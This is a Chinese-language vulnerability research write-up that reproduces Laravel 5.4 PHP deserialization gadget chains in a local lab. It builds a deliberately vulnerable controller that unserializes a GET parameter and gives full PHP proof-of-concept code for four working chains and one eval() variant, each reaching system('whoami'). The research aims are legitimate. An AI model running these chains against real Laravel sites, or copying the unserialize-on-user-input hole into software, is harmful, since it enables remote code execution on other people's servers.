# 环境搭建

php版本:7.3.4

系统:win10

laravel的运行时需要composer的

安装composer:

https://getcomposer.org/Composer-Setup.exe下载

然后运行,一直next

然后在安装目录下

![image-20210628212851893](images/1.png)

出现如下反应则为成功

执行命令:`composer global require "laravel/installer"`安装下载工具

执行命令:`composer create-project laravel/laravel=5.4 laravel5-4 --prefer-dist`安装laravel5.4

在laravel5.4命令下执行命令`php artisan serve`

![image-20210628214650440](images/2.png)

访问127.0.0.1:8000

![image-20210628214719155](images/3.png)

环境搭建完成

在`routes/web.php`下添加路由:

```
Route::get("/index","\App\Http\Controllers\DemoController@demo");
```

![image-20210816104015246](images/4.png)

在`app/Http/Controllers/DemoController.php`添加控制器

需要自己创建该php文件

```
<?php 
namespace App\Http\Controllers;

use Illuminate\Http\Request;
class DemoController extends Controller
{
    public function demo()
    {
        if(isset($_GET['c'])){
            $code = $_GET['c'];
            unserialize($code);
        }
        else{
            highlight_file(__FILE__);
        }
        return "Welcome to laravel5.4";
    }
}
```

这里我并没有用base64编码,我看网上的师傅打的时候都用的base64,poc也是base64,当时打的时候要报错,看了看,原来是unserialize那里没有base64解码

如果用base64打的话则应该是`unserialize(base64_decode($code))`

或者直接写poc的时候用urlencode也是可以的,我就直接用的urlencode了

![image-20210629204806228](images/5.png)

访问127.0.0.1:8000/index

![image-20210629204835849](images/6.png)

现在就可以开始我们的漏洞分析与复现了

# 漏洞分析

## 失败的链子

先从入口点下手,全局搜索`__destruct`方法

最后定位到一个`__destruct()`方法

```
laravel5-4\vendor\laravel\framework\src\Illuminate\Broadcasting\PendingBroadcast.php
```

![image-20210630224429703](images/7.png)

下一步就是全局寻找`__call`方法或者`dispatch`方法

```
在vendor\fzaninotto\faker\src\Faker\Generator.php下找到了一个可用的__call()方法
```

![image-20210630225012502](images/8.png)

跟进`format()`方法

![image-20210630225417430](images/9.png)

好熟悉的东西这和YII2的反序列化漏洞一样诶

```
在YII里,我们是通过控制$this->formatters[$formatter]的值调用一个无参函数run()

而这里我们可以控制$this->formatters=['dispatch'=>'system']来对数组中的'dispatch'赋值,访问$this->formatters['dispatch']的时候就是调用'system'函数来rce
```

![image-20210701002852610](images/10.png)

```
call_user_func_array()需要第二个参数是一个数组
```

```
但是__call方法返回的第二个参数是个数组,所以我们的$this->event='whoami就可以执行,不需要再赋值为数组
执行时就是system('whoami')
```

拿exp打一下呢

```
<?php
namespace Illuminate\Broadcasting
{
	use Faker\Generator;
	class PendingBroadcast{
		protected $event;
		protected $events;
		public function __construct()
		{
			$this->events=new Generator();
			$this->event='whoami';
		}
	}
	$a=new PendingBroadcast();
	echo urlencode(serialize($a));
}
namespace Faker{
	class Generator{
		protected $formatters = array();
		public function __construct()
		{
			$this->formatters=['dispatch'=>'system'];
		}
	}
}
```

淦，报错了

## ![image-20210701190635250](images/11.png)

他并没有访问到$this->formatters['dispatch']

原来是Generator.php下存在一个wakeup方法给掐掉了

![image-20210701191021942](images/12.png)

```
$this->formatters被替换成了空数组,所以并不存在$this->formatters['dispatch']了
由于laravel要php的版本在7.2以上才能运行,已经不能绕过wakeup方法了
```

可以尝试把wakeup方法注释了其实就能打通了，可以去试试

这条链子看来是用不了了

# 第一条链

## 漏洞分析

刚才的call方法打不通那就再看看有没有其他可用的call方法呢

入口点还是一样的

```
laravel5-4\vendor\laravel\framework\src\Illuminate\Broadcasting\PendingBroadcast.php
```

__call方法定位到了

```
laravel5-4\vendor\laravel\framework\src\Illuminate\Support\Manager.php
```

![image-20210809100702521](images/13.png)

跟进driver()

![image-20210809100731944](images/14.png)

这个函数的返回值是`$this->drivers[$driver]`,看看怎么来的

if循环里面会调用`$this->createDriver($driver)`来给`$this->drivers[$driver]`赋值

跟进createDriver()函数

![image-20210809101008471](images/15.png)

`$this-customCreators[$driver]`是可控的,这样就会进入到callCustomCreator()

跟进callCustomCreator()

![image-20210809101254374](images/16.png)

这里的`$this-customCreators[$driver]`和`$this->app`是可控的话就可以直接rce了

`$this-customCreators[$driver]`和`$this->app`是自定义变量可控

看看`$driver`的值怎么来的

![image-20210809101547903](images/17.png)

跟进getDefaultDriver()

![image-20210809101628252](images/18.png)

![image-20210809101648352](images/19.png)

这个函数被定义成了抽象函数,所以需要找他在它的继承类中的重写

这三个继承类中,在ChannelManager中对他进行了重写

![image-20210809101846829](images/20.png)

这个`$this->defaultChannel`也是可控的

那就可以直接写poc了、

这是我自己写的poc

```
<?php
namespace Illuminate\Broadcasting
{
    use Illuminate\Notifications\ChannelManager;
    class PendingBroadcast
    {
        protected $events;
        public function __construct()
        {
            $this->events=new ChannelManager();
        }
    }
    echo urlencode(serialize(new PendingBroadcast()));
}
namespace Illuminate\Notifications
{
    abstract class Manager
    {
        protected $app;
        protected $customCreators = [];
    }
    class ChannelManager extends Manager
    {
        protected $defaultChannel;
        public function __construct()
        {
            $this->app='whoami';
            $this->customCreators=['town'=>'system'];
            $this->defaultChannel='town';
        }
    }
}
```

网上给的poc

```
<?php
namespace Illuminate\Broadcasting
{
    use  Illuminate\Notifications\ChannelManager;
    class PendingBroadcast
    {
        protected $events;

        public function __construct($cmd)
        {
            $this->events = new ChannelManager($cmd);
        }
    }
    echo base64_encode(serialize(new PendingBroadcast($argv[1])));
}


namespace Illuminate\Notifications
{
    class ChannelManager
    {
        protected $app;
        protected $defaultChannel;
        protected $customCreators;

        public function __construct($cmd)
        {
            $this->app = $cmd;
            $this->customCreators = ['jiang' => 'system'];
            $this->defaultChannel = 'jiang';
        }
    }
}
```

主要是想看看抽象类用不用在poc里面定义出来

## 漏洞复现

![image-20210809111342475](images/21.png)

虽然这里出现了一堆报错,但是最上面还是返回了我想要执行的命令

# 第二条链子

## 漏洞分析

漏洞入口点还是不变

```
laravel5-4\vendor\laravel\framework\src\Illuminate\Broadcasting\PendingBroadcast.php
```

去找到了另外一个__call方法

```
laravel5-4\vendor\laravel\framework\src\Illuminate\Validation\Validator.php
```

![image-20210809135644524](images/22.png)

看看$rule的值是怎么来的

substr($method,offset:8)，offset和start作用差不多

这是从地8个开始截取,由于这里的$method的值是dispatch，dispatch只有8个字符所以substr这里其实是为空的

这里调用了一个静态函数,ctrl+b进到str.php中

![image-20210809140054642](images/23.png)

$value的值就为空了

所以这里其实是不会进入第一个if循环的

```
ctype_lower做小写检测
```

这里进入了第二个if循环

但是并没有对value的值造成任何影响,返回值仍然为空

![image-20210809140637204](images/24.png)

那这里`$this->extensions[$rule]`是可控的,能进入if循环,调用callExtension()

跟进callExtension()

![image-20210809140733521](images/25.png)

这里$callback是可控的,那就可以进入if循环,调用call_user_fun_array()

```
$parameters是进入__call方法的那个值，已经被处理成了数组,这里只要$callback='system'
$parameters='whoami'即可
```

$this->extensions=[' '='system']

poc如下

```
<?php
namespace Illuminate\Broadcasting
{
    use Illuminate\Validation\Validator;
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct()
        {
            $this->events=new Validator();
            $this->event='whoami';
        }
    }
    echo urlencode(serialize(new PendingBroadcast()));
}
namespace Illuminate\Validation
{
    class Validator
    {
        public $extensions = [];
        public function __construct()
        {
            $this->extensions=[''=>'system'];
        }
    }
}
```



## 漏洞复现

![image-20210811014027849](images/26.png)

# 第三条链子

## 漏洞分析

入口点不变

```
laravel5-4\vendor\laravel\framework\src\Illuminate\Broadcasting\PendingBroadcast.php
```

这次换个思路,去找dispatch函数

定位到了

```
laravel5-4\vendor\laravel\framework\src\Illuminate\Events\Dispatcher.php
```

![image-20210811014450378](images/27.png)

可变函数,研究研究能不能控制参数

先看parseEventAndPayload()函数,再看getListeners()函数是否能够rce的

跟进parseEventAndPayload()函数

![image-20210811014540043](images/28.png)

这里的$payload我们开始并没有传值,就是空,这里是不可控的,并且没有控制点

而且我不能做到使他的返回值是system,放弃这个函数

换个函数,跟进getListeners()函数

![image-20210811014732299](images/29.png)

这里就不一样了,`$this->listeners[$eventName]`中的`$eventName是​最开始传过来的$event`

这个参数是可控的,然后就合并`$listeners和$this->getWildcardListeners[$eventName]`这两个数组

这里合并数组的时候需要注意，array_merge()这个函数的参数必须是数组,所以`$this->listeners[$eventName]`的值必须是一个数组,所以`$this->listeners[$eventName=['system']]`

其实`$this->getWildcardListeners($eventName)`是可以不用看的,因为在dispatch()函数中也会遍历getListeners()这个函数的返回值,所以可以忽略getWildcardListeners()这个函数

最后返回值会判断存不存在$eventName这个类,很明显rce的时候是不存在system这个类名的

那最后的返回值就是$listeners

所以$responses=system('whoami')

最后dispatch返回值,看这个php文件中,`$halt是false,所以返回的就是$responses`的值

![image-20210811021655833](images/30.png)

poc

```
<?php
namespace Illuminate\Broadcasting
{
    use  Illuminate\Events\Dispatcher;
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct()
        {
            $this->events = new Dispatcher();
            $this->event='whoami';
        }
    }
    echo urlencode(serialize(new PendingBroadcast()));
}


namespace Illuminate\Events
{
    class Dispatcher
    {
       protected $listeners;
       public function __construct(){
           $this->listeners=['whoami'=>['system']];
       }
    }
}
```

## 漏洞复现

![image-20210811021221343](images/31.png)

# 第四条链子

## 漏洞分析

继续寻找dispatch方法,最后定位到了

```
laravel5-4\vendor\laravel\framework\src\Illuminate\Bus\Dispatcher.php
```

![image-20210811101922073](images/32.png)

这里的两个return看上去有点像可以rce的点

```
$this->queueResolver是可控的,并且调用$this->commandShouldBeQueued($command)也是可以执行的，那就可以进入这个if循环
```

跟进dispatchToQueue()

![image-20210811102156509](images/33.png)

`$command`是我们最开始在入口点的​`$event`,这个是可控的,这里的语句很明显$command应该是为一个类名的

但是在我们当前类中,并不存在$connection属性,是无法访问的

所以在call_user_func()这个函数当中,$connecton是不可控的

回到dispatch函数

![image-20210811102659058](images/34.png)

跟进一下commandShouldBeQueyed()

![image-20210811102730852](images/35.png)

![image-20210811102946176](images/36.png)

具体可以参照:https://www.jb51.net/article/74409.htm

继续回到代码这里来

判断 `$command`是否是 `ShouldQueue` 的实现。

我们这里传入的 `$command` 必须是 `ShouldQueue` 接口的一个实现。而且`$command` 类中包含`connection`属性。

其实我们刚才的,只要能够控制$connection的值即可rce了

找一下和ShouldQueue有关的文件

![image-20210811103953919](images/37.png)

在BroadcastEvent.php中找到了

![image-20210811103824544](images/38.png)

他利用了Queueable,ctrl+b跳过去看看

![image-20210811104030564](images/39.png)

trait定义了一个类，里面具有可控的$connection属性

那这样,`$command`只要是BroadCastEvent类的接口,那就是ShouldQueue类的接口,commandShouldBeQueued()函数的返回值就为真,那就可以进入if循环,所以`$command`类可以赋值为BroadCastEvent类,又因为BroadCastEvent类利用了Queueable,所以能够访问Queueable类中的`$connection`属性,从而控制$connection,实现rce

poc

```
<?php
namespace Illuminate\Broadcasting
{
    use  Illuminate\Bus\Dispatcher;
    class BroadcastEvent
    {
        public $connection;
        public function __construct()
        {
            $this->connection='whoami';
        }
    }
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct()
        {
            $this->events = new Dispatcher();
            $this->event=new BroadcastEvent();
        }
    }
    echo urlencode(serialize(new PendingBroadcast()));
    
}


namespace Illuminate\Bus
{
    class Dispatcher
    {
       protected $queueResolver;
       public function __construct()
       {
            $this->queueResolver='system';
       }
    }
}
```

## 漏洞复现

这次又报错了,不过好在返回了命令执行结果

![image-20210811105240564](images/40.png)

# 后续

其实这最后的一条链子也可以不这么做

![image-20210811105624257](images/41.png)

在这里,call_user_func()的方法名是可控的,那么久可以去回调任意类的任何方法

只要有危险函数的方法都有可能

看师傅的复现,找到的是

```
laravel5-4\vendor\mockery\mockery\library\Mockery\Loader\EvalLoader.php
```

![image-20210811105932908](images/42.png)

这里load函数将MockDefinition类定义为变量$definition,其实传过来的还是`$connection`

我们想在eval()这儿实现rce,跟进MockDefinition中的getCode()

![image-20210811121040045](images/43.png)

直接返回一个可控制的变量

那么只要我们不进入if循环即可

看看if循环的条件,判断类存不存在

跟进getClassName()

![image-20210811121147075](images/44.png)

$this->config是可控的,那就可以随便去调用一个类中的getName()方法

```
laravel5-4\vendor\laravel\framework\src\Illuminate\Session\Store.php
```

这里可用的getName()方法有点多我就随便找到一个

![image-20210811122817543](images/45.png)

那我只要控制$this->name的值为一个不存在的类就可以绕个if循环了

poc

```
<?php
namespace Illuminate\Bus{
    use Mockery\Loader\EvalLoader;
    class Dispatcher{
    protected $queueResolver;

    public function __construct(){
        $this->queueResolver = [new EvalLoader(),'load'];
    }
}
}
namespace Illuminate\Broadcasting{
    use Illuminate\Bus\Dispatcher;
    use Mockery\Generator\MockDefinition;
    class BroadcastEvent{
        public $connection;

        public function __construct($code){
            $this->connection  = new MockDefinition($code);
        }
    }
    class PendingBroadcast{
        protected $events;
        protected $event;

        public function __construct($event){
            $this->events =  new Dispatcher();
            $this->event = new BroadcastEvent($event);
        }   
    }
echo urlencode(serialize(new PendingBroadcast(system('whoami'))));  
}
namespace Mockery\Loader{
    class EvalLoader{}
}
namespace Mockery\Generator{
    use Illuminate\Session\Store;
    class MockDefinition{
        protected $config;
        protected $code;
        public function __construct($code){
            $this->config=new Store();
            $this->code=$code;
        }
    }
}
namespace Illuminate\Session{
    class Store{
        protected $name='town';
    }
}
?>
```

![image-20210811125202309](images/46.png)

其实这种方法还是略显麻烦了

还是要用到$connect,也要想办法去控制他

既然能控制了,就没必要再去找其他危险函数了,用call_user_func()就可以直接rce了





# 小结

laravel的反序列化洞还是多,这只是5.4的,但是看大师傅的文章说这打成功的 4条链在laravel5.4-5.8的版本都能够打通,等后面审计5.7  5.8的时候试试吧





参考链接

https://xz.aliyun.com/t/9478#toc-6

